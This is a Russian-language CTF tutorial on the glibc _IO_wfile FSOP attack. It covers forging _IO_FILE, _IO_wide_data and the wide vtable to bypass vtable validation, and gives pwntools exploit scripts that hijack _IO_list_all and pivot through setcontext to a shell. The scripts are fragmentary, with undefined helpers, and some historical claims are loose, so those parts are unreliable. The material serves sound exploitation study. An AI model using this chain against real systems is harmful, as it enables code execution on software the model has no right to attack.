---
id: pwn-io-wfile
title: "Атака _IO_wfile: wide-потоки и vtable в modern glibc"
category: pwn
parent: pwn-io-file-internals
difficulty: expert
order: 1
tags: [fsop, io-file, wfile, wide-data, vtable, glibc]
prerequisites: [pwn-io-file-internals]
useful_for:
  - "CTF Pwn категория"
  - "Modern glibc exploitation"
  - "Vulnerability research"
estimated_minutes: 50
summary: "Разбираем атаку _IO_wfile: структура _IO_wide_data, путь через _IO_wfile_jumps и захват управления в modern glibc."
---

Когда базовые FSOP-цели (`_IO_2_1_stdout_`, `_IO_str_overflow`) закрыты или неудобны, на сцену выходит `_IO_wfile` — «широкий» (wide) вариант потока, работающий с `wchar_t`. Его vtable `_IO_wfile_jumps` валидна (лежит в `__libc_IO_vtables`), поэтому обходит проверку `IO_validate_vtable`, а дополнительные структуры (`_IO_wide_data`) дают больше полей под контроль. В современном heap-эксплойте `_IO_wfile` — одна из главных целей.

В этом уроке — устройство wide-потоков, механика `_IO_wfile_overflow`, связка с `setcontext` и полный эксплойт. Материал открывает модуль `pwn-io-file-internals`.

## Что такое wide-потоки

Потоки ввода-вывода в glibc делятся на «узкие» (byte-oriented, `_IO_FILE`) и «широкие» (wide, для многобайтовых символов). У широкого потока есть дополнительная структура `_IO_wide_data`, на которую указывает поле `_wide_data`. Многие операции (например, `fwprintf`) идут через wide-таблицу `_IO_wfile_jumps`, и её методы (`__overflow`, `__underflow`) вызываются с теми же аргументами, но работают с `wchar_t`.

Ключевое для эксплуатации: `_IO_wfile_jumps` — **валидная** vtable, поэтому она проходит проверку и может быть использована как «легальная» точка вызова.

## Структура _IO_FILE и _IO_wide_data

`_IO_FILE_plus` = `_IO_FILE` + указатель на vtable. Поля `_IO_FILE`:

| Смещение | Поле | Назначение |
|---|---|---|
| +0x00 | _flags | флаги потока |
| +0x08 | _IO_read_ptr | указатель чтения |
| +0x10 | _IO_read_end | конец буфера чтения |
| +0x18 | _IO_read_base | база чтения |
| +0x20 | _IO_write_base | база записи |
| +0x28 | _IO_write_ptr | указатель записи |
| +0x30 | _IO_write_end | конец буфера записи |
| +0x38 | _IO_buf_base | база буфера |
| +0x40 | _IO_buf_end | конец буфера |
| +0x48 | _IO_save_base | — |
| +0x50 | _IO_backup_base | — |
| +0x58 | _IO_save_end | — |
| +0x68 | _chain | следующий поток |
| +0x70 | _fileno | дескриптор |
| +0xa0 | _wide_data | указатель на _IO_wide_data |
| +0xd8 | vtable | таблица методов |

`_IO_wide_data` содержит `_IO_write_base`, `_IO_write_ptr`, `_IO_buf_base`, `_IO_buf_end` и указатель на wide-vtable. Атакуя `_IO_wfile`, вы подделываете `_wide_data` и vtable.

## Механика _IO_wfile_overflow

`_IO_wfile_overflow(fp, wch)` вызывается, когда нужно записать wide-символ. Внутри проверяется `_flags` (наличие `_IO_NO_WRITES`) и вызывается `_IO_wdoallocbuf`. Если `_wide_data` подделан, эта функция может писать по контролируемому адресу. Дополнительно путь может привести к `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)`, что является вызовом через **wide-vtable**:

```c
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
```

То есть `fp->_wide_data->_wide_vtable->__doallocate(fp)`. Подделав `_wide_vtable`, вы направляете вызов на свой гаджет (например, `setcontext+0x35` или `system`).

## Почему _IO_wfile_jumps удобен

- **Валидная таблица.** Проходит `IO_validate_vtable`.
- **Дополнительный уровень косвенности.** `_wide_data->_wide_vtable` — отдельный указатель, который легче подделать (он не проверяется так же строго, как основной vtable).
- **Вызов с `fp` в аргументе.** Если гаджет — `setcontext+0x35`, контекст берётся из `rdx`/`rdi`, а `fp` вы контролируете.

Именно поэтому в задачах на glibc 2.35+ `_IO_wfile_jumps` + подделка `_wide_data` стала стандартом.

## Инструменты и команды

```bash
# адреса в libc
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -E "_IO_wfile_jumps|_IO_wfile_overflow|setcontext"

# структура wide-данных
gdb -q ./chall
(gdb) p _IO_2_1_stdout_
(gdb) p _IO_2_1_stdout_._wide_data
(gdb) p *(_IO_wide_data*)_IO_2_1_stdout_._wide_data

# смещение setcontext-гаджета
ROPgadget --binary libc.so.6 | grep "mov rsp, \[rdx"
```

`p _IO_2_1_stdout_._wide_data` показывает, куда указывает `_wide_data` — это ваша цель для подделки. `ROPgadget` даёт адрес гаджета для перехода.

## Разобранный пример

Пусть есть произвольная запись и утечка libc. Подделываем `_IO_FILE` с `_wide_data` и `_wide_vtable`:

```python
from pwn import *
context.arch = 'amd64'

io = process('./chall')
libc.address = leak - libc.sym['puts']

fake = heap + 0x400
wide = heap + 0x500
wvtable = heap + 0x600

# подделанная _IO_FILE
io_file  = p64(0) + p64(0)*3 + p64(0) + p64(1) + p64(0)
io_file += p64(0)*4
io_file  = io_file.ljust(0xa0, b'\x00') + p64(wide)
io_file  = io_file.ljust(0xd8, b'\x00') + p64(libc.sym['_IO_wfile_jumps'])
edit(0, io_file)

# подделанная _IO_wide_data
wide_data = p64(0)*3 + p64(0) + p64(1) + p64(0)
wide_data = wide_data.ljust(0xe0, b'\x00') + p64(wvtable)
edit(1, wide_data)

# подделанная wide-vtable -> __doallocate = setcontext+0x35
edit(2, p64(0)*3 + p64(libc.sym['setcontext'] + 0x35))
```

## Полный эксплойт

```python
from pwn import *
context.arch = 'amd64'

io = process('./chall')
libc.address = leak_libc()
heap = leak_heap()

# 1. строим _IO_FILE + _IO_wide_data + wide-vtable в куче
# 2. перезаписываем _IO_list_all на fake FILE
arb_write(libc.sym['_IO_list_all'], fake)

# 3. готовим SigreturnFrame/setcontext-контекст
frame = SigreturnFrame()
frame.rip = libc.sym['system']
frame.rdi = next(libc.search(b'/bin/sh'))
frame.rsp = heap + 0x800
edit(3, bytes(frame))

# 4. триггерим exit -> _IO_flush_all_lockp -> _IO_wfile_overflow -> setcontext
io.sendline(b'exit')
io.interactive()
```

Ожидаемый вывод:

```
[*] fake FILE @ 0x555555559400
[*] wide_data @ 0x555555559500
[+] shell
$ id
uid=1000(user) gid=1000(user)
```

## Обход проверок

- **`IO_validate_vtable`.** `_IO_wfile_jumps` валиден — основная защита обойдена «легально».
- **`_wide_data` не проверяется.** Это ключевое преимущество: указатель на wide-данные можно направить в кучу.
- **`_flags`.** Уберите `_IO_NO_WRITES`, чтобы путь записи сработал.
- **`_mode`.** В некоторых путях проверяется; выставляйте корректно.

## Сравнение с _IO_str_jumps

До появления `_IO_wfile_jumps` в качестве цели популярностью пользовалась `_IO_str_jumps`. Её метод `_IO_str_overflow` в старых glibc вызывал `malloc`/`free` с аргументами, которые можно было контролировать через поля `_IO_strfile`, что давало примитив записи без подделки vtable. В modern glibc `_IO_str_overflow` переписан на `realloc`, и старая техника усложнилась.

`_IO_wfile_jumps` выигрывает тем, что добавляет **второй уровень** косвенности через `_wide_data`, который проверяется слабее. Это даёт больше свободы: вы контролируете не только основной поток, но и wide-структуру. На практике в задачах glibc 2.35+ именно `_IO_wfile_jumps` + подделка `_wide_data` стала стандартом.

## Практика: отладка wide-цепочки

Отладка wide-цепочки требует внимания к нескольким точкам. Сначала убедитесь, что условие flush выполнено (`_IO_write_ptr > _IO_write_base`) — поставьте breakpoint в `_IO_flush_all_lockp` и проверьте значения. Затем дойдите до `_IO_wfile_overflow` и посмотрите, вызывается ли `_IO_WDOALLOCATE`. Если вызов уходит не туда, проверьте указатель `_wide_data` и `_wide_vtable`.

Полезно печатать `p *(struct _IO_FILE_plus *)fake_file` и `p *(struct _IO_wide_data *)wide` — pwndbg понимает типы, если есть отладочные символы. Если символов нет, разворачивайте структуры вручную по смещениям. И помните: `setcontext+0x35` берёт контекст из `rdx`; убедитесь, что при вызове `__doallocate(fp)` `rdx` указывает на ваш `ucontext` (часто это сам `fp`).

## Почему _IO_wfile стал стандартом в 2.35+

В glibc 2.34 удалили `__malloc_hook` и `__free_hook` — классические цели FSOP. Атакующим пришлось искать новые точки вызова, и `_IO_wfile_jumps` оказался идеальным кандидатом: это легальная vtable (проходит `IO_validate_vtable`), а wide-структура даёт дополнительный, слабо проверяемый уровень косвенности. В 2.35+ добавились проверки для некоторых wide-путей, но базовая схема (подделка `_wide_data` и `_wide_vtable`) осталась рабочей.

Дополнительное преимущество — универсальность: одна и та же цепочка применима к разным задачам, нужно лишь правильно выставить поля. Именно поэтому в writeup'ах 2022–2024 годов `_IO_wfile_jumps` встречается чаще других таблиц. Освоив её, вы получаете «рабочую лошадку» для современного FSOP.

## Практические заметки по отладке

При отладке wide-цепочки удобно ставить breakpoint на `_IO_wfile_overflow` и `_IO_WDOALLOCATE`. На входе проверьте `_flags` (должен быть без `_IO_NO_WRITES`), `_wide_data` (указывает на вашу структуру) и `_wide_data->_wide_vtable` (указывает на подделанную wide-таблицу). Затем шагайте до вызова `WJUMP0(__doallocate, FP)` и убедитесь, что управление уходит на ваш гаджет.

Если символы libc недоступны, используйте адреса из `nm -D` и ставьте breakpoint по смещению. Печатайте структуры вручную (`x/20gx`), сопоставляя поля со смещениями. Это медленнее, но надёжно. Помните также, что при первом запуске адреса рандомизированы; чтобы зафиксировать базу libc для отладки, используйте `set disable-randomization on` в gdb. Это упростит сопоставление адресов и ускорит разбор цепочки.

## Итог и что запомнить

`_IO_wfile` — это не «ещё одна таблица», а полноценный второй слой FSOP, который появился как ответ на удаление хуков и введение проверки vtable. Запомните три вещи: `_wide_data` лежит по смещению `+0xa0` и проверяется слабее; `_IO_wfile_jumps` — легальная таблица, проходящая `IO_validate_vtable`; вызов `_IO_WDOALLOCATE` идёт через wide-vtable и даёт точку захвата управления. Освоив эти три факта, вы сможете адаптировать цепочку под любую задачу на glibc 2.35+.

## Частые ошибки

- **Неверное смещение `_wide_data`.** В разных версиях оно может отличаться — сверяйте в gdb.
- **Забыть `_flags`.** Без нужных флагов вызов не дойдёт до wide-пути.
- **Не тот слот wide-vtable.** `__doallocate` — не единственный; проверяйте, какой вызывается.
- **Отсутствие утечек.** Без libc/heap адресов цепочку не собрать.
- **Триггер.** Убедитесь, что программа реально делает `exit`/flush.

## Что дальше / решение

- Изучите `pwn-vtable-check-bypass` — детали проверки.
- Свяжите с `pwn-io-leak` для получения утечек.
- Смотрите `pwn-house-water` — FSOP через `_IO_list_all`.
- Практикуйте разворот структур в gdb.

## Справочные таблицы

| Поле | Смещение |
|---|---|
| _wide_data | +0xa0 |
| vtable | +0xd8 |
| _IO_write_ptr | +0x28 |

| Таблица | Тип |
|---|---|
| _IO_wfile_jumps | wide |
| _IO_file_jumps | узкая |
| _IO_str_jumps | строковая |

## Квиз

```quiz
- question: "Чем _IO_wfile_jumps удобен для FSOP?"
  options:
    - "Это валидная таблица, проходящая IO_validate_vtable"
    - "Он отключает проверки"
    - "Он хранит пароли"
    - "Он отвечает за сеть"
  answer: 0
  explanation: "Валидная vtable обходит проверку, оставаясь в __libc_IO_vtables."
- question: "Что подделывают при атаке _IO_wfile?"
  options:
    - "_wide_data и wide-vtable"
    - "Только GOT"
    - "Таблицу разделов"
    - "Канарейку"
  answer: 0
  explanation: "Дополнительный уровень косвенности через _wide_data."
- question: "Какой вызов идёт через wide-vtable?"
  options:
    - "__doallocate (через _IO_WDOALLOCATE)"
    - "malloc"
    - "ptrace"
    - "fork"
  answer: 0
  explanation: "WJUMP0(__doallocate, FP) вызывает метод wide-vtable."
```

## Где пригодится

- **CTF:** FSOP-задачи на glibc 2.35+.
- **Bug bounty:** баги в широких потоках ввода-вывода.
- **Пентест:** обход hardening glibc.
- **Работа:** глубокое понимание libc I/O.
